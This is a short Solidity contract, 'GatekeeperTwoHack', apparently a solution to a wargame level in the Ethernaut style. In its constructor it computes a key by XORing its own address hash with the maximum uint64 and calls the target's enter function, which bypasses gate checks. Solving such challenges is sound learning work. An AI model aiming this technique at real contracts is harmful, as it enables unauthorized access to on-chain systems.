// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwoHack {
    address public target;

    constructor(address _target) payable {
        target = _target;
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        target.call(abi.encodeWithSignature("enter(bytes8)",bytes8(key)));
    }

}
